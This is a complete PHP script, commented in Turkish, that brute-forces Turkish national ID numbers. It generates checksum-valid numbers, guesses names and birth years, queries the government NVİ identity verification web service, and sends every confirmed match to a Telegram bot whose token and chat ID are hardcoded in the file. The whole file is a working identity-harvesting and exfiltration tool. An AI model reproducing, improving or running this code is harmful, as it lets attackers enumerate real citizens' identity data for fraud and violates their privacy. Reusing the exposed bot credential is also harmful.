<?php
header('Content-Type: text/html; charset=utf-8');
set_time_limit(0);

// --- TELEGRAM AYARLARI ---
$botToken = "8405664089:AAEJi8ipuYWCeKpRSFFYGINACt4Sej1xeNI"; // BotFather'dan aldığın kod
$chatId = "8258235296";     // UserInfoBot'tan aldığın ID

function telegramGonder($mesaj, $token, $id) {
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$id&text=" . urlencode($mesaj);
    @file_get_contents($url);
}

// --- TC ÜRETİCİ ---
function tcUret() {
    $digits = [rand(1, 9)];
    for ($i = 1; $i < 9; $i++) $digits[$i] = rand(0, 9);
    $tek = $digits[0] + $digits[2] + $digits[4] + $digits[6] + $digits[8];
    $cift = $digits[1] + $digits[3] + $digits[5] + $digits[7];
    $h10 = (($tek * 7) - $cift) % 10;
    if ($h10 < 0) $h10 += 10;
    $h11 = (array_sum($digits) + $h10) % 10;
    return implode('', $digits) . $h10 . $h11;
}

// --- NVİ SORGULAYICI (CURL) ---
function nviSorgula($tc, $ad, $soyad, $yil) {
    $xml = '<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <TCKimlikNoDogrula xmlns="http://tckimlik.nvi.gov.tr/WS">
          <TCKimlikNo>'.$tc.'</TCKimlikNo>
          <Ad>'.$ad.'</Ad>
          <Soyad>'.$soyad.'</Soyad>
          <DogumYili>'.$yil.'</DogumYili>
        </TCKimlikNoDogrula>
      </soap:Body>
    </soap:Envelope>';

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://tckimlik.nvi.gov.tr/Service/KPSPublic.asmx");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $xml);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: text/xml; charset=utf-8',
        'SOAPAction: "http://tckimlik.nvi.gov.tr/WS/TCKimlikNoDogrula"',
        'Content-Length: ' . strlen($xml)
    ]);

    $response = curl_exec($ch);
    curl_close($ch);
    return (strpos($response, '<TCKimlikNoDogrulaResult>true</TCKimlikNoDogrulaResult>') !== false);
}

// Havuzlar
$isimler = ["MEHMET", "MUSTAFA", "AHMET", "ALİ", "HÜSEYİN", "AYŞE", "FATMA", "EMİNE"];
$soyisimler = ["YILMAZ", "KAYA", "DEMİR", "ŞAHİN", "ÇELİK", "YILDIZ"];

echo "<h2>Tarama Başlatıldı...</h2>";

for($i=0; $i<50; $i++) {
    $tc = tcUret();
    $ad = $isimler[array_rand($isimler)];
    $soyad = $soyisimler[array_rand($soyisimler)];
    $yil = rand(1975, 2005);

    if (nviSorgula($tc, $ad, $soyad, $yil)) {
        $msg = "✅ KİŞİ BULUNDU!\nTC: $tc\nİsim: $ad $soyad\nYıl: $yil";
        telegramGonder($msg, $botToken, $chatId);
        echo "<b style='color:green;'>BULUNDU: $tc - Telegram'a İletildi!</b><br>";
    } else {
        echo "Denendi: $tc (Olumsuz)<br>";
    }
    flush(); // Ekrana anlık basar
    usleep(300000); // 0.3 sn bekle
}
?>
